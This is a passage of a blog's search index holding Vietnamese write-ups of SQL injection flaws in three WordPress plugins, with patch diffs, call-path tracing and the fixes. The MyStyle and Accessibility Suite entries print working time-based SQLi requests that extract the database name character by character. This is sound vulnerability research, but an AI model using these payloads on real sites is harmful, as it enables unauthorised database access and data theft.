$_SERVER[\u0026#39;REQUEST_URI\u0026#39;]; // Get the design profile page\u0026#39;s WP_Post slug. /* @var $post \\WP_Post phpcs:ignore */ $post = get_post( self::get_id() ); $slug = $post-\u0026gt;post_name; $pattern = \u0026#39;/^.*\\/\u0026#39; . $slug . \u0026#39;\\/([\\d]+)/\u0026#39;; if ( preg_match( $pattern, $path, $matches ) ) { $design_id = $matches[1]; } else { $design_id = false; } // ------------------------------------- } return $design_id; } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nüëâ H√†m n√†y l·∫•y design_id t·ª´ url n√™n khi kh√¥ng th√™m n√≥ v√†o url khi g·ª≠i request =\u0026gt; if x·∫£y ra =\u0026gt; init_index_request ƒë∆∞·ª£c g·ªçi.\nQuay tr·ªü l·∫°i h√†m init, n√≥ ƒë∆∞·ª£c g·ªçi trong __construct c·ªßa c√πng class.\npublic function __construct() { // other logic add_action( \u0026#39;init\u0026#39;, array( \u0026amp;$this, \u0026#39;rewrite_rules\u0026#39; ) ); add_action( \u0026#39;template_redirect\u0026#39;, array( \u0026amp;$this, \u0026#39;init\u0026#39; ) ); } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\ninit l√† callback g·∫Øn v√†o hook template_redirect: l√† m·ªôt action hook trong WordPress, ch·∫°y tr∆∞·ªõc khi n·ªôi dung template th·ª±c s·ª± ƒë∆∞·ª£c load v√† hi·ªÉn th·ªã ra tr√¨nh duy·ªát.\nPh√≠a tr√™n hook template_redirect trong __construct c√≤n c√≥ hook init, n√≥ s·∫Ω ch·∫°y tr√™n m·ªói request v·ªõi callback rewrite_rules:\npublic function rewrite_rules() { // Flush rewrite rules for newly created rewrites. flush_rewrite_rules(); add_rewrite_rule( \u0026#39;designs/([a-zA-Z0-9_-].+)?$\u0026#39;, // designs/{slug} \u0026#39;index.php?pagename=designs\u0026amp;design_id=$matches[1]\u0026#39;, \u0026#39;top\u0026#39; ); } H√†m n√†y th√™m route /designs/{id} ƒë·ªÉ load trang designs v√† truy·ªÅn bi·∫øn design_id.\nüëâ Nh∆∞ v·∫≠y khi truy c·∫≠p v√†o /designs/:\nCallback rewrite_rules ƒë∆∞·ª£c g·ªçi, WordPress s·∫Ω load /index.php?pagename=designs\u0026amp;design_id=. design_id kh√¥ng c√≥ gi√° tr·ªã n√™n get_design_id_from_url ƒë∆∞·ª£c g√°n cho $design_id s·∫Ω l√† false =\u0026gt; ƒëi·ªÅu ki·ªán false === $design_id x·∫£y ra khi·∫øn init_index_request trong kh·ªëi if ƒë∆∞·ª£c g·ªçi. init_index_request g·ªçi ƒë·∫øn get_designs get_designs l·∫•y tr·ª±c ti·∫øp orderby t·ª´ GET request th√™m v√†o c√¢u query ƒë·ªÉ th·ª±c thi Exploit Detect SQLi G·ª≠i GET request ch·ª©a payload SQLi.\nGET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nTrong tr∆∞·ªùng h·ª£p n√†y kh√¥ng n√™n comment ph√≠a sau SLEEP. V√¨ developer ƒë√£ enter khi·∫øn OFFSET xu·ªëng d√≤ng th·ª© 2, khi comment ho·∫°t ƒë·ªông, parser c·ªßa SQL s·∫Ω x·ª≠ l√Ω v√† tr·∫£ v·ªÅ l·ªói. {: .prompt-info }\nCu·ªói c√πng s·∫Ω ƒë∆∞·ª£c t√°ch th√†nh 2 c√¢u query ·ªü 2 d√≤ng kh√°c nhau g√¢y ra l·ªói:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) -- ASC LIMIT 25\tOFFSET 0 Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nGET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ orderby ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-48281 trong plugin WordPress MyStyle Custom Product Designer tr∆∞·ªõc phi√™n b·∫£n 3.21.2 xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai white list, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress MyStyle Custom Product Designer Plugin \u0026lt;= 3.21.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-48281/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.21.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48281\"\u003eCVE-2025-48281\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mystyle-custom-product-designer\"\u003eWordPress MyStyle Custom Product Designer Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.21.1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e:  v3.21.1(vul) v√† v3.21.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eMyStyle Custom Product Designer Plugin\u003c/strong\u003e, m·ªôt s·ªë h√†m trong \u003cstrong\u003eWooCommerce\u003c/strong\u003e s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-48281"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Accessibility Suite c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 4.19. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 4.18 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Accessibility Suite: v4.18(vul) v√† v4.19(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho input v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng prepare() ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/classes/Helper.php\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $list = json_decode( $wpdb-\u0026gt;get_results($wpdb-\u0026gt;prepare(\u0026#34;SELECT list FROM $table_name WHERE scan_id = $scan_id\u0026#34;))[0]-\u0026gt;list // phpcs:ignore ); } {: file=\u0026ldquo;includes/classes/Helper.php v4.18\u0026rdquo; }\nB·∫£n v√° ƒë√£ truy·ªÅn $scan_id nh∆∞ tham s·ªë v√†o c√¢u query. SQL injection ƒë∆∞·ª£c ph√≤ng ng·ª´a v√¨ bi·∫øn kh√¥ng ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o query n·ªØa.\nstatic function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return \u0026#39;\u0026#39;; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\u0026#34;status\u0026#34; =\u0026gt; \u0026#34;failed\u0026#34;, \u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;Invalid scan ID\u0026#34;]; } // Get list using properly prepared query $query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT list FROM %i WHERE scan_id = %d\u0026#34;, $table_name, $scan_id ); $result = $wpdb-\u0026gt;get_results($query); } {: file=\u0026ldquo;includes/classes/Helper.php v4.19\u0026rdquo; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m tƒ©nh save_false_positive c·ªßa class Helper thu·ªôc file includes/classes/Helper.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a save_false_positive trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ save_false_positive ƒë∆∞·ª£c callback c·ªßa action hook wp_ajax_ONLINE_ADAv4/save_false_positive g·ªçi.\nKhi POST request ƒë∆∞·ª£c g·ª≠i ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi action=ONLINE_ADAv4/save_false_positive callback ƒë∆∞·ª£c g·ªçi. Trong request c·∫ßn 2 POST param issue_id v√† scan_id. N·∫øu kh√¥ng, ·ª©ng d·ª•ng s·∫Ω tr·∫£ v·ªÅ:\n{\u0026#34;status\u0026#34;:\u0026#34;failed\u0026#34;,\u0026#34;msg\u0026#34;:\u0026#34;Did not receive the scan ID or the issue ID\u0026#34;} save_false_positive ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë issue_id v√† scan_id. C√°c ƒë·ªëi s·ªë n√†y s·∫Ω b·ªã escape b·ªüi magic quotes trong WordPress v√¨ l·∫•y tr·ª±c ti·∫øp t·ª´ POST request.\n·ª®ng d·ª•ng check xem ng∆∞·ªùi d√πng c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin kh√¥ng. N·∫øu kh√¥ng, tr·∫£ v·ªÅ chu·ªói r·ªóng.\nif(! is_admin()) { return \u0026#39;\u0026#39;; } Sau ƒë√≥ c√°c ƒë·ªëi s·ªë tr·ª±c ti·∫øp truy·ªÅn v√†o c√¢u query ch·ª©a l·ªó h·ªïng SQLi r·ªìi th·ª±c thi.\nExploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi. V√¨ ch·ªâ c·∫ßn l√† user c√≥ quy·ªÅn truy c·∫≠p v√†o trang admin, n√™n ta t·∫°o user v·ªõi role:subcriber c√≥ privilege th·∫•p nh·∫•t.\nTrong WordPress, user c√≥ role cao h∆°n s·∫Ω k·∫ø th·ª´a c·∫£ privilege role th·∫•p h∆°n. N√™n ch·ªâ c·∫ßn user subcriber g·ª≠i payload th√†nh c√¥ng th√¨ t·∫•t c·∫£ user c√≤n l·∫°i ƒë·ªÅu c√≥ th·ªÉ. ƒê√∫ng v·ªõi m√¥ t·∫£ c·ªßa CVE\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT SLEEP(5) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh\nSELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng v·ªõi truy v·∫•n tr∆∞·ªõc ƒë√≥. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026amp;issue_id=1\u0026amp;scan_id=1 UNION SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ nh∆∞ ph√¢n t√≠ch ·ªü tr√™n, scan_id s·∫Ω b·ªã escape.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-32650 trong plugin WordPress Accessibility Suite tr∆∞·ªõc phi√™n b·∫£n 4.19 xu·∫•t ph√°t t·ª´ vi·ªác tri·ªÉn khai kh√¥ng ƒë√∫ng h√†m $wpdb-\u0026gt;prepare() d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai ƒë√∫ng $wpdb-\u0026gt;prepare, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nLu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Accessibility Suite Plugin \u0026lt;= 4.18 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-32650/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eAccessibility Suite\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.19\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-32650\"\u003eCVE-2025-32650\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/online-accessibility/\"\u003eWordPress Accessibility Suite Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 4.18\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAccessibility Suite\u003c/strong\u003e:  v4.18(vul) v√† v4.19(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ch∆∞a th·ª±c hi·ªán √©p ki·ªÉu cho \u003cstrong\u003einput\u003c/strong\u003e v√† m·∫∑c d√π c√≥ s·ª≠ d·ª•ng \u003ccode\u003eprepare()\u003c/code\u003e ƒë·ªÉ ch·ªëng SQLi, nh∆∞ng do tri·ªÉn khai kh√¥ng ƒë√∫ng n√™n l·ªó h·ªïng SQLi v·∫´n t·ªìn t·∫°i.\u003c/p\u003e","title":"CVE-2025-32650"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Mail Mint c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.18.6. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-58604 Product: WordPress Mail Mint Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.18.5 CVSS severity: Low (7.6) Required Privilege: Administrator Requirements Local WordPress and Debugging Mail Mint: v1.18.5(vul) v√† v1.18.6(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis ·ª®ng d·ª•ng ƒë√£ ƒë∆∞a tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query SQL m√† kh√¥ng s·ª≠ d·ª•ng c√°c bi·ªán ph√°p b·∫£o v·ªá khi·∫øn l·ªó h·ªïng SQL Injection x·∫£y ra.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file /app/Utilities/Helper/Import.php\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; $total_query = \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;)\u0026#34;; $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query to retrieve user IDs with limit and offset. $final_query = \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;prefix}usermeta WHERE meta_key IN (\u0026#39;\u0026#34; . implode(\u0026#34;\u0026#39;, \u0026#39;\u0026#34;, $keys) . \u0026#34;\u0026#39;) GROUP BY user_id LIMIT $number OFFSET $offset\u0026#34;; $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.5\u0026quot; }\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() thay v√¨ truy·ªÅn tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng v√†o c√¢u query.\npublic static function get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) { // other logic global $wpdb; // Total query (safe with prepare) $total_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT COUNT(DISTINCT user_id) as total FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders)\u0026#34;, $keys ); $total = $wpdb-\u0026gt;get_var($total_query); //phpcs:ignore // Final query with LIMIT \u0026amp; OFFSET (safe with prepare) $final_query = $wpdb-\u0026gt;prepare( \u0026#34;SELECT user_id FROM {$wpdb-\u0026gt;usermeta} WHERE meta_key IN ($placeholders) GROUP BY user_id LIMIT %d OFFSET %d\u0026#34;, array_merge($keys, array($number, $offset)) ); $users = $wpdb-\u0026gt;get_results($final_query, ARRAY_A); //phpcs:ignore // other logic } {: file=\u0026quot;/app/Utilities/Helper/Import.php v1.18.6\u0026quot; }\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_wp_users_by_learndash_with_limit_offset($courses, $number = 5, $offset = 0) c·ªßa class Import. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª± kh√≥a get_wp_users_by_learndash_with_limit_offset trong th∆∞ m·ª•c ch·ª©a plugin.\nK·∫øt qu·∫£ cho th·∫•y h√†m n√†y ƒë∆∞·ª£c g·ªçi trong:\nretrieve_contacts_associated_with_learndash() perform_learndash_user_import() thu·ªôc class ContactImportAction trong file /app/API/Actions/Admin/Contact/ContactImportAction.php.\nTi·∫øp theo, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i retrieve_contacts_associated_with_learndash() ƒë∆∞·ª£c s·ª≠ d·ª•ng, ta t√¨m ki·∫øm t·ª´ kh√≥a retrieve_contacts_associated_with_learndash trong th∆∞ m·ª•c plugin.\nH√†m n√†y ƒë∆∞·ª£c g·ªçi trong map_contacts_with_learndash() thu·ªôc class ContactImportController trong file /app/API/Controllers/Admin/Contact/ContactImportController.php.\nTi·∫øp t·ª•c t√¨m ki·∫øm t·ª´ kh√≥a map_contacts_with_learndash ƒë·ªÉ xem h√†m n√†y ƒë∆∞·ª£c ƒëƒÉng k√Ω ·ªü ƒë√¢u:\nTa ph√°t hi·ªán r·∫±ng n√≥ ƒë∆∞·ª£c d√πng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress:\nclass ContactImportRoute extends AdminRoute { public function register_routes() { register_rest_route( $this-\u0026gt;namespace, // mrm/v1 $this-\u0026gt;rest_base . \u0026#39;/learndash/map\u0026#39;, // contacts/import/learndash/map/ array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::CREATABLE, // POST \u0026#39;callback\u0026#39; =\u0026gt; array( $this-\u0026gt;controller, \u0026#39;map_contacts_with_learndash\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; PermissionManager::current_user_can(\u0026#39;mint_manage_contacts\u0026#39;), // Admin \u0026#39;args\u0026#39; =\u0026gt; array( \u0026#39;selectedCourses\u0026#39; =\u0026gt; array( \u0026#39;description\u0026#39; =\u0026gt; __( \u0026#39;The selected courses from which to import contacts.\u0026#39;, 